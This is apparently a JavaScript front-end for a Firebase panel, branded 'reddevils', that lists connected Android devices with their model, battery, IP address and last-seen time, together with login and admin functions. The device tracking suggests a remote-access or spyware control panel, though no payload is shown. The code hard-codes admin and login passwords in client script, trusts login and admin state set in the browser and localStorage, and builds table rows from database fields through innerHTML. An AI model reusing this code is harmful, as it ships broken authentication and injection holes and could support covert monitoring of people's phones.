// Initialize Firebase
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

let devices = {};
let currentUser = null;
let isAdmin = false;

const devicesTableBody = document.getElementById("devices-table-body");
const connectionStatus = document.getElementById("connection-status");
const totalDevicesEl = document.getElementById("total-devices");
const onlineDevicesEl = document.getElementById("online-devices");
const offlineDevicesEl = document.getElementById("offline-devices");

// 🔥 ADMIN CREDENTIALS
const ADMIN_EMAIL = "theanonymous@gmail.com";
const ADMIN_PASSWORD = "theanonymousontop";

// ========== CHECK IF EMAIL IS VALID ==========
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// ========== CHECK IF EMAIL IS BLOCKED ==========
async function isEmailBlocked(email) {
    const snap = await db.ref('blockedEmails/' + email.replace(/\./g, '_')).once('value');
    return snap.exists();
}

// ========== GET CURRENT WEB LOGIN CREDENTIALS ==========
async function getWebLoginCredentials() {
    const snap = await db.ref('webLogin').once('value');
    const data = snap.val() || {
        email: "AhsanxPanther1@gmail.com",
        password: "AhsanxPantherOnTop",
        showHint: true
    };
    return data;
}

// ========== UPDATE LOGIN HINT ==========
async function updateLoginHint() {
    const credentials = await getWebLoginCredentials();
    const hintElement = document.getElementById('loginHint');
    if (hintElement) {
        if (credentials.showHint) {
            hintElement.textContent = `${credentials.email} / ${credentials.password}`;
        } else {
            hintElement.textContent = "Email:-AhsanxPanther1@gmail.com / Password 🔑:-AhsanxPantherOnTop";
        }
    }
}

// ========== NORMAL USER LOGIN ==========
window.handleLogin = async function() {
    const input = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value.trim();
    
    if (!input || !password) {
        alert('Please enter email and password');
        return;
    }
    
    // Check if input is a valid email
    if (!isValidEmail(input)) {
        alert('❌ Please enter a valid email address');
        return;
    }
    
    const email = input;
    
    // Check if email is blocked
    const blocked = await isEmailBlocked(email);
    if (blocked) {
        alert('⛔ ACCESS DENIED: This email is blocked');
        return;
    }
    
    // Check if it's admin trying to login as normal user
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        // Show admin login modal instead
        document.getElementById('adminModal').classList.add('active');
        document.getElementById('adminLogin').style.display = 'block';
        document.getElementById('adminDashboard').style.display = 'none';
        return;
    }
    
    // Get current web login credentials
    const webCredentials = await getWebLoginCredentials();
    
    // Verify against web login credentials
    if (email !== webCredentials.email || password !== webCredentials.password) {
        alert('❌ Invalid email or password');
        return;
    }
    
    // Save normal user data
currentUser = {
    email: email,
    loginTime: Date.now(),
    lastActive: Date.now()
};

// 🔥 CHECK: If email is admin email, mark as admin
if (email === ADMIN_EMAIL) {
    isAdmin = true;
    // Save admin session (24 hours)
    localStorage.setItem('reddevils_admin', JSON.stringify({
        email: email,
        loginTime: Date.now(),
        isAdmin: true
    }));
} else {
    isAdmin = false;
    // Remove any old admin session
    localStorage.removeItem('reddevils_admin');
}

// Save to localStorage
localStorage.setItem('reddevils_user', JSON.stringify(currentUser));

// Save to Firebase
await db.ref('users/' + email.replace(/\./g, '_')).set({
    email: email,
    loginTime: Date.now(),
    lastActive: Date.now(),
    status: 'active',
    isAdmin: isAdmin
});
    
    // Hide login screen, show dashboard
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    
    // Start loading data
    init();
};

// ========== ADMIN LOGIN ==========
window.adminLogin = async function() {
    const email = document.getElementById('adminEmail').value.trim();
    const password = document.getElementById('adminPassword').value.trim();
    
    if (!email || !password) {
        alert('Please enter email and password');
        return;
    }
    
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        isAdmin = true;
        currentUser = { email: email, loginTime: Date.now() };
        
        // 🔥 SAVE ADMIN SESSION TO LOCALSTORAGE (24 HOURS)
        localStorage.setItem('reddevils_admin', JSON.stringify({
            email: email,
            loginTime: Date.now(),
            isAdmin: true
        }));
        
        // Hide admin login, show admin dashboard
        document.getElementById('adminLogin').style.display = 'none';
        document.getElementById('adminDashboard').style.display = 'block';
        
        // Load admin data
        loadAdminData();
        alert('✅ Admin login successful!');
    } else {
        alert('❌ Invalid admin credentials');
    }
};

// ========== CLOSE ADMIN PANEL ==========
window.closeAdminPanel = function() {
    document.getElementById('adminModal').classList.remove('active');
    document.getElementById('adminLogin').style.display = 'block';
    document.getElementById('adminDashboard').style.display = 'none';
};

// ========== SHOW CHANGE PASSWORD PANEL ==========
window.showChangePasswordPanel = function() {
    document.getElementById('changePasswordModal').classList.add('active');
    document.getElementById('changePasswordAccess').style.display = 'block';
    document.getElementById('changePasswordForm').style.display = 'none';
};

// ========== CLOSE CHANGE PASSWORD PANEL ==========
window.closeChangePasswordPanel = function() {
    document.getElementById('changePasswordModal').classList.remove('active');
};

// ========== VERIFY ADMIN FOR PASSWORD CHANGE ==========
window.verifyAdminForPasswordChange = function() {
    const email = document.getElementById('changeAdminEmail').value.trim();
    const password = document.getElementById('changeAdminPassword').value.trim();
    
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        document.getElementById('changePasswordAccess').style.display = 'none';
        document.getElementById('changePasswordForm').style.display = 'block';
    } else {
        alert('❌ Invalid admin credentials');
    }
};

// ========== CHANGE WEB LOGIN ==========
window.changeWebLogin = async function() {
    const newEmail = document.getElementById('newWebEmail').value.trim();
    const newPassword = document.getElementById('newWebPassword').value.trim();
    const showHint = document.getElementById('hintYes').checked;
    
    if (!newEmail || !newPassword) {
        alert('Please enter new email and password');
        return;
    }
    
    if (!isValidEmail(newEmail)) {
        alert('❌ Please enter a valid email address');
        return;
    }
    
    await db.ref('webLogin').set({
        email: newEmail,
        password: newPassword,
        showHint: showHint
    });
    
    await updateLoginHint();
    
    alert('✅ Website login credentials updated!');
    closeChangePasswordPanel();
};

// ========== CHECK SESSION ==========
async function checkSession() {
    const saved = localStorage.getItem('reddevils_user');
    if (saved) {
        const user = JSON.parse(saved);
        
        // Check if email is blocked
        const blocked = await isEmailBlocked(user.email);
        if (blocked) {
            localStorage.removeItem('reddevils_user');
            localStorage.removeItem('reddevils_admin');
            document.getElementById('loginScreen').style.display = 'flex';
            document.getElementById('dashboard').style.display = 'none';
            return;
        }
        
        currentUser = user;
        
        // 🔥 CHECK ADMIN SESSION (24 HOURS VALIDITY)
        const adminSession = localStorage.getItem('reddevils_admin');
        if (adminSession) {
            try {
                const adminData = JSON.parse(adminSession);
                const isExpired = (Date.now() - adminData.loginTime) > (24 * 60 * 60 * 1000);
                
                if (adminData.email === ADMIN_EMAIL && adminData.isAdmin === true && !isExpired) {
                    isAdmin = true;
                    console.log("✅ Admin session restored");
                } else {
                    // Session expired or invalid
                    localStorage.removeItem('reddevils_admin');
                    isAdmin = false;
                }
            } catch (e) {
                localStorage.removeItem('reddevils_admin');
                isAdmin = false;
            }
        } else {
            isAdmin = false;
        }
        
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        
        // Update last active
        db.ref('users/' + user.email.replace(/\./g, '_')).update({
            lastActive: Date.now(),
            status: 'active'
        });
        
        init();
    } else {
        document.getElementById('loginScreen').style.display = 'flex';
        document.getElementById('dashboard').style.display = 'none';
    }
}

// ========== LOGOUT ==========
window.logout = function() {
    if (currentUser && !isAdmin) {
        db.ref('users/' + currentUser.email.replace(/\./g, '_')).update({
            status: 'offline',
            lastActive: Date.now()
        });
    }
    
    // 🔥 CLEAR BOTH USER AND ADMIN SESSIONS
    localStorage.removeItem('reddevils_user');
    localStorage.removeItem('reddevils_admin');
    
    currentUser = null;
    isAdmin = false;
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginScreen').style.display = 'flex';
};

function init() {
    // Connection Status
    db.ref(".info/connected").on("value", (snap) => {
        if (snap.val() === true) {
            connectionStatus.textContent = "Connected";
            connectionStatus.classList.add("status-online");
            connectionStatus.classList.remove("status-offline");
        } else {
            connectionStatus.textContent = "Disconnected";
            connectionStatus.classList.add("status-offline");
            connectionStatus.classList.remove("status-online");
        }
    });

    // Devices Listener
    db.ref("devices").on("value", (snap) => {
        devices = snap.val() || {};
        renderDevicesTable();
        updateStats();
    });
    
    // Update login hint on init
    updateLoginHint();
}

function renderDevicesTable() {
    devicesTableBody.innerHTML = "";
    if (Object.keys(devices).length === 0) {
        devicesTableBody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 2rem; color: var(--text-secondary);">No active connections</td></tr>';
        return;
    }

    Object.entries(devices).forEach(([id, device]) => {
        const row = document.createElement("tr");
        const isOnline = device.status === "online";

        const statusBadge = `<span class="status-badge ${isOnline ? "status-online" : "status-offline"}">${isOnline ? "Online" : "Offline"}</span>`;

        row.innerHTML = `
            <td>${statusBadge}</td>
            <td style="font-weight: 500; color: var(--text-main);">${device.model || "Unknown"}</td>
            <td>${device.androidVersion || "N/A"}</td>
            <td class="battery-level">${device.batteryLevel ? device.batteryLevel + "%" : "N/A"}</td>
            <td style="font-family: monospace;">${device.ipAddress || "Unknown"}</td>
            <td>${device.lastSeen ? new Date(device.lastSeen).toLocaleString() : "Never"}</td>
            <td>
                <a class="btn btn-sm btn-gradient-purple" href="device.html?id=${id}">
                    View Details
                </a>
            </td>
        `;
        devicesTableBody.appendChild(row);
    });
}

function updateStats() {
    const total = Object.keys(devices).length;
    const online = Object.values(devices).filter(d => d.status === "online").length;
    const offline = total - online;

    totalDevicesEl.textContent = total;
    onlineDevicesEl.textContent = online;
    offlineDevicesEl.textContent = offline;
}

// ========== 🔥 ADMIN FUNCTIONS (OLD - SAME) ==========

function loadAdminData() {
    console.log("📊 Loading admin data...");
    
    const usersBody = document.getElementById('admin-users-body');
    usersBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">Loading users...</td></tr>';
    
    // Load users from Firebase
    db.ref('users').once('value', (snap) => {
        const users = snap.val();
        console.log("👥 Users from Firebase:", users);
        
        let html = '';
        let totalUsers = 0;
        let onlineUsers = 0;
        
        if (users) {
            const userList = [];
            
            Object.keys(users).forEach(key => {
                const user = users[key];
                if (user.isAdmin) return; // Skip admin
                userList.push(user);
                totalUsers++;
                if (user.status === 'online') onlineUsers++;
            });
            
            document.getElementById('admin-total-users').textContent = totalUsers;
            document.getElementById('admin-online-users').textContent = onlineUsers;
            
            if (userList.length === 0) {
                usersBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No users found</td></tr>';
                return;
            }
            
            let processedCount = 0;
            
            userList.forEach(user => {
                const emailKey = user.email.replace(/\./g, '_');
                
                db.ref('blockedEmails/' + emailKey).once('value', (blockSnap) => {
                    const isBlocked = blockSnap.exists();
                    
                    html += `
                        <tr>
                            <td>${user.email || 'Unknown'}</td>
                            <td>${user.loginTime ? new Date(user.loginTime).toLocaleString() : 'Never'}</td>
                            <td>
                                ${!isBlocked ? 
                                    `<button class="block-btn" onclick="blockEmail('${user.email}')">BLOCK</button>` : 
                                    `<span class="blocked-badge">BLOCKED</span>`
                                }
                            </td>
                        </tr>
                    `;
                    
                    processedCount++;
                    if (processedCount === userList.length) {
                        usersBody.innerHTML = html;
                        console.log("✅ Users table updated");
                    }
                });
            });
            
        } else {
            usersBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No users found</td></tr>';
            document.getElementById('admin-total-users').textContent = '0';
            document.getElementById('admin-online-users').textContent = '0';
        }
    });
    
    // Load blocked emails
    db.ref('blockedEmails').once('value', (snap) => {
        const blocked = snap.val();
        const blockedBody = document.getElementById('blocked-emails-body');
        let html = '';
        let blockedCount = 0;
        
        if (blocked) {
            Object.keys(blocked).forEach(key => {
                const data = blocked[key];
                blockedCount++;
                html += `
                    <tr>
                        <td>${data.email}</td>
                        <td>${new Date(data.blockedAt).toLocaleString()}</td>
                        <td>
                            <button class="unblock-btn" onclick="unblockEmail('${data.email}')">UNBLOCK</button>
                        </td>
                    </tr>
                `;
            });
            blockedBody.innerHTML = html;
        } else {
            blockedBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No blocked emails</td></tr>';
        }
        
        document.getElementById('admin-blocked-emails').textContent = blockedCount;
    });
}

// Block email
window.blockEmail = function(email) {
    if (confirm(`⚠️ Block email ${email}?`)) {
        db.ref('blockedEmails/' + email.replace(/\./g, '_')).set({
            email: email,
            blockedAt: Date.now(),
            blockedBy: 'admin'
        }).then(() => {
            db.ref('users/' + email.replace(/\./g, '_')).update({ 
                status: 'blocked' 
            }).then(() => {
                alert(`✅ Email ${email} blocked`);
                loadAdminData(); // Refresh data
            });
        });
    }
};

// Unblock email
window.unblockEmail = function(email) {
    if (confirm(`✅ Unblock email ${email}?`)) {
        db.ref('blockedEmails/' + email.replace(/\./g, '_')).remove().then(() => {
            db.ref('users/' + email.replace(/\./g, '_')).update({ 
                status: 'online' 
            }).then(() => {
                alert(`✅ Email ${email} unblocked`);
                loadAdminData(); // Refresh data
            });
        });
    }
};

// Show admin panel
window.showAdminPanel = function() {
    document.getElementById('adminModal').classList.add('active');
    document.getElementById('adminLogin').style.display = 'block';
    document.getElementById('adminDashboard').style.display = 'none';
};

// Initialize on load
window.onload = function() {
    checkSession();
    updateLoginHint();
};